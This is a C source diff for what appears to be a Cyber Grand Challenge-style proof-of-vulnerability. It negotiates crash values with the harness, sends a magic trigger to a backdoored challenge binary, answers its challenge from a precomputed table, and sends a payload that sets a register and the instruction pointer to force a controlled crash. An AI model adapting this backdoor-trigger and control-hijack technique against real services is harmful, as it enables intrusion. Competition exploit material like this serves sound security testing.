@@ -21,6 +21,38 @@ void *memcpy(void *dst, const void *src, size_t n) {
    return dst;
 }
 
+int strlen(char *s) {
+  int len = 0;
+  while (s[len]) {
+    len++;
+  }
+  return len;
+}
+
+int send_all(int fd, const void *msg, size_t n_bytes)
+{
+  size_t len = 0;
+  size_t tx = 0;
+  while(len < n_bytes) {
+    if (transmit(fd, (char *)msg + len, n_bytes - len, &tx) != 0) {
+      return 1;
+    }
+    len += tx;
+  }
+  return 0;
+}
+
+void send_str(unsigned char* str){
+  send_all(1,(unsigned char*)str,strlen((char*)str));
+  return;
+}
+
+void send_str_nl(unsigned char* str){
+  send_str(str);
+  send_all(1,"\n",1);
+  return;
+}
+
 size_t receive_until(int fd, char *dst, char delim, size_t max )
 {
     size_t len = 0;
@@ -46,6 +78,35 @@ end:
     return len;
 }
 
+size_t receive_until_str(int fd, char *dst, const char* delim, int delim_length, size_t max )
+{
+    size_t len = 0;
+    size_t rx = 0;
+    char c = 0;
+    int delim_idx = 0;
+    while( len < max ) {
+        dst[len] = 0x00;
+
+        if ( receive( fd, &c, 1, &rx ) != 0 ) {
+            len = 0;
+            goto end;
+        }
+        if ( c == delim[delim_idx] ) {
+            delim_idx += 1;
+        }else{
+            delim_idx = 0;
+        }
+        if ( delim_idx == delim_length ){
+          goto end;
+        }
+   
+        dst[len] = c;
+        len++;
+    }
+end:
+    return len;
+}
+
 size_t receive_n( int fd, unsigned char *dst, size_t n_bytes )
 {
   size_t len = 0;
@@ -59,37 +120,6 @@ size_t receive_n( int fd, unsigned char *dst, size_t n_bytes )
   }
 
   return len;
-}
-
-int send_all(int fd, const void *msg, size_t n_bytes)
-{
-  size_t len = 0;
-  size_t tx = 0;
-  while(len < n_bytes) {
-    if (transmit(fd, (char *)msg + len, n_bytes - len, &tx) != 0) {
-      return 1;
-    }
-    len += tx;
-  }
-  return 0;
-}
-
-int strlen(unsigned char* str){
-  int i=0;
-  while(str[i]!='\x00'){
-    i++;
-  }
-  return i;
-}
-
-void send_str(unsigned char* str){
-  send_all(1,(unsigned char*)str,strlen(str));
-  return;
-}
-void send_str_nl(unsigned char* str){
-  send_str(str);
-  send_all(1,"\n",1);
-  return;
 }
 
 unsigned int receive_int_nl(){
@@ -145,22 +175,86 @@ void send_int_space(uint32_t input){
   send_str((unsigned char*)" ");
 }
 
+enum register_t
+{
+    eax = 0,
+    ecx = 1,
+    edx = 2,
+    ebx = 3,
+    esp = 4,
+    ebp = 5,
+    esi = 6,
+    edi = 7
+};
+
+
+void *memset(void *dst, int c, unsigned int n) {
+   char *d = (char*)dst;
+   while (n--) {*d++ = (char)c;}
+   return dst;
+}
+
+void int_to_str(int num, int base, char *dst) {
+  char const digit[] = "0123456789abcdefghijkl";
+  char* p = dst;
+  if(num < 0){
+      *p++ = '-';
+      num *= -1;
+  }
+  int shifter = num;
+  do{ //Move to where representation ends
+      ++p;
+      shifter = shifter/base;
+  } while (shifter);
+  *p = '\0';
+  do{ //Move back, inserting digits as u go
+      *--p = digit[num%base];
+      num = num/base;
+  }while(num);
+}
+
+typedef struct type1_vals_ {
+   unsigned int ipval;
+   unsigned int regval;
+} type1_vals;
+
+
 /*
-int K( int i ) { return
- i < 20 ? K1 : 
- i < 40 ? K2 :
- i < 60 ? K3 : K4;
+ * Negotiate a type 1 pov. Caller specifies an ip bit mask, a register bit mask
+ * and a general purpose register number (see the list below).
+ *
+   0 - eax
+   1 - ecx
+   2 - edx
+   3 - ebx
+   4 - esp
+   5 - ebp
+   6 - esi
+   7 - edi
+ *
+ * Returns 0 on success. On success, the t1vals structure holds required IP
+ * and register values that must be found when the target CB crashes. At the
+ * time of the crash the following must hold:
+ *  (crash_eip & ipmask) == t1vals->ipval
+ *  (crash_REG & regmask) == t1vals->regval
+ */
+int type1_negotiate(unsigned int ipmask, unsigned int regmask, unsigned int regnum, type1_vals *t1vals) {
+   uint32_t povType = 1;
+   if (send_all(3, &povType, sizeof(povType)) ||
+       send_all(3, &ipmask, sizeof(ipmask)) ||
+       send_all(3, &regmask, sizeof(regmask)) ||
+       send_all(3, &regnum, sizeof(regnum))) {
+      return -1;
+   }
+   if (receive_n(3, (unsigned char *)t1vals, sizeof(type1_vals)) != sizeof(type1_vals)) {
+      return -1;
+   }
+   return 0;
 }
 
-int F( int i, int B, int C, int D ) { return
- i < 20 ?  (D ^ ( B & (C ^ D))) : 
- i < 40 ? (D ^ B ^ C) : 
- i < 60 ? (B & C) | (D & (B ^ C)) : 
- (D ^ B ^ C) ;
-}
-*/
 
-
+// sha1 implementation, copied and pasted inside backdoor.py
+/*
 //---------------------------------------
 // right now, this is compiled to 268 bytes with -Oz
 
@@ -169,19 +263,9 @@ int F( int i, int B, int C, int D ) { return
 #define K3 0x8F1BBCDC
 #define K4 0xCA62C1D6
 
-
-//TODO it seems this is not used by final compiled code (but it is still present in the compiled code)
-// find a way to tell clang to remove it
-int ROTATE_LEFT(const int value, int shift) {
-    unsigned int uvalue = (unsigned int)value;
-    return (uvalue << shift) | (uvalue >> (32- shift));
-}
-
-
-
-// Update HASH[] by processing a one 64-byte block in MESSAGE[]
 __attribute__((__fastcall)) int SHA1(int MESSAGE[] )
 {
+  //__asm("int $3");
   // these arrays are not necessary but used to better highlight dependencies
   int B, C, D, E;
   int A,An;
@@ -197,23 +281,11 @@ __attribute__((__fastcall)) int SHA1(int MESSAGE[] )
   E = 0xC3D2E1F0;
 
   for ( i=0; i<80; ++i ){
-    //send_int_nl(A[i]);
-    // W[i] calculation, also known as 'Message Scheduling'
     if ( i < 16 ){
       // reverse the order of bytes on little-endian
       W[i] = MESSAGE[i];
-      //send_int_nl(i);
-      //send_int_nl(W[i]);
     }else{
       W[i] = ROTATE_LEFT( W[i-3] ^ W[i-8] ^ W[i-14] ^ W[i-16], 1 );
-      //send_int_space(i);
-      //send_int_space(W[i-3]);
-      //send_int_space(W[i-8]);
-      //send_int_space(W[i-14]);
-      //send_int_nl(W[i-16]);
-      //send_int_nl(W[i-3] ^ W[i-8] ^ W[i-14] ^ W[i-16]);
-      //send_int_nl(ROTATE_LEFT( W[i-3] ^ W[i-8] ^ W[i-14] ^ W[i-16], 1 ));
-      //send_int_nl(W[i]);
     }
 
 
@@ -231,66 +303,88 @@ __attribute__((__fastcall)) int SHA1(int MESSAGE[] )
       FN = (D ^ B ^ C);
     }
 
-    //FN = F( i, B, C, D );
-
-
-    //send_int_nl(FN);
-    //send_int_nl(E[i]);
-    //send_int_nl(W[i]);
-    //send_int_nl(K(i));
-
     An = FN + E + ROTATE_LEFT( A, 5 ) + W[i] + K;
-    //send_int_space(A[i+1]);
-    //send_int_space(FN);
-    //send_int_space(E[i]);
-    //send_int_space(K(i));//
-    //send_int_nl(W[i]);//
 
     E = D;
     D = C;
     C = ROTATE_LEFT( B, 30 );
-    A = An;
     B = A;
-    //send_int_nl(A[i+1]);
-  }
+    A = An;
 
+  }
 
   return (0x67452301 + A);
 }
+
+//TODO it seems this is not used by final compiled code (but it is still present in the compiled code)
+// find a way to tell clang to remove it
+int ROTATE_LEFT(const int value, int shift) {
+    unsigned int uvalue = (unsigned int)value;
+    return (uvalue << shift) | (uvalue >> (32- shift));
+}
 //-----------------------
+*/
 
-
+/*
 uint32_t sha1block(uint8_t input[5]){
-  // this will be written in asm
   uint32_t* addr;
   uint32_t res;
 
   allocate(0x1000, 0, (void*) &addr);
   addr[0] = input[0]<<24|input[1]<<16|input[2]<<8|input[3];
   addr[1] = input[4]<<24;
-
   res = SHA1((int*)addr);
-  deallocate(addr,0x1000); //not necessary in final code
-  //check if i == res (i terminates with zeros, so it must res)
   return res;
 }
+*/
 
+
+void sleep(int secs, int usecs) {
+    struct timeval tv;
+    tv.tv_sec = secs;
+    tv.tv_usec = usecs;
+    fdwait(0, NULL, NULL, &tv, NULL);
+}
 
 int main() {
-  uint32_t res;
-  unsigned int i;
+  uint32_t challenge;
+  unsigned char* res;
+  char response[16];
+  unsigned int len;
+  char big_buffer[100000];
 
-  for(i=0;i<0x80000;i++){
-    res = sha1block(&(backdoor_solutions[i*5]));
-    //send_str("------");
-    //send_int_nl(res);
-    if((res!=i) || ((res&0x7ffff)!=res)){
-      send_int_space(i);
-      send_int_nl(res);
-    }
+  type1_vals negotiated_vals;
+  if(type1_negotiate(0x000fffff,0x000fffff,3,&negotiated_vals)){
+    return 1;
   }
+  //hope that this gets not fragmented
+  if(send_all(1,"\x33\x67\xb1\x80",4)){
+    return 1;
+  }
+  sleep(1,0); //wait a superstitious second
+  // send_all(2,(void*)"111\n",4);
+  len = receive_until_str(1,big_buffer,"\x04\xd0\xcc\xba",4,100000);
+  // send_all(2,(void*)"333\n",4);
+  //send_all(2,(void*)(&big_buffer[len-4-4+1]),4);
+  // send_all(2,(void*)"444\n",4);
+  memcpy((void*) (&challenge), (void *)(&(big_buffer[len-4-4+1])),4);
+  res = &(backdoor_solutions[challenge*5]);
+  // endianness is crazy
+  response[0] = res[3];
+  response[1] = res[2]; 
+  response[2] = res[1];
+  response[3] = res[0]; 
+  response[4] = 0; 
+  response[5] = 0;
+  response[6] = 0;
+  response[7] = res[4];
+  // we go just after the flag page, likely to be unmapped
+  // the point is that we do not want to jmp to executable memory
+  negotiated_vals.ipval = 0x44000000 | (negotiated_vals.ipval & 0x00ffffff);
+  memcpy((void*) (&(response[8])), (void *)(&(negotiated_vals.regval)),4);
+  memcpy((void*) (&(response[12])), (void *)(&(negotiated_vals.ipval)),4);
+  send_all(1,(void*)(response),16);
 
-  send_str((unsigned char*)"------\n");  
   return 0;
 }
 
